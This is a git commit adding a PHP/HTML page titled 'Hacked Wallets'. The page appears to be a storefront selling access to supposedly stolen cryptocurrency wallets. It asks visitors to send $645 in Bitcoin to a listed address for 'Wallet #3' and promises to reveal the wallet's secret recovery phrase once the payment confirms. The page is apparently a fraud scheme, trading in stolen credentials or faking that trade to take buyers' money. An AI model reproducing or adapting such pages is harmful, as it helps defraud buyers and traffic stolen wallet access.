5e0f51c9dd2b06dd3eb4ce594b26cc4dc1267c3d
Hack Live <59341206+hack-live@users.noreply.github.com>
2022-03-17 00:59:07 -0700

    Add files via upload

---
+++ PP3.php
@@ -0,0 +1,35 @@
+<html><head>
+    <title>Hacked Wallets </title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="icon" type="image/png" href="logo.png">
+    <link rel="stylesheet" href="main.css">
+</head>
+
+<body bgcolor="#3656af">
+<a href="index.html"><img src="logo.png" class="mainlogo"></a>
+<a href="index.html"><img src="title.png" class="maintitle"></a>
+<div class="paymentcontainer">
+    <a href="default.htm" target="_blank"><img src="mainphone.png" class="imagedetails"></a>
+
+   <br><center><img src="BTC.png" class="qr">
+   <br><br><br>Please send $645 in BTC to :<br><b>15iEaryeiYEq32PamCu1VFyBLcQ3fMwYZA</b>
+   <br> 0/1 Confirmation
+   <br> <img src="load.gif" class="loading">
+   <br><a href="PP1.php"><div class="buttonrefresh">Refresh Status</div></a>
+</center></div>
+ 
+  
+<div class="paymentcontainer">
+<div class="field">  
+   <div class="receipt">Wallet #3<br>Estimated Amount: 3,213 +
+   <br>Price: $645 USD
+  
+    </div>
+<div class="req">
+Please hit "Refresh Status" once your payment has 1 network confirmation.    
+<br>Please do NOT close this window. Your secret recovery phrase will be shown for one time here ! </div>
+
+</div></div>
+
+</body>
+<script async src="../https@www.googletagmanager.com/gtag/js@id=UA-123404068-1"></script><script>window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', 'UA-123404068-1');</script></html>
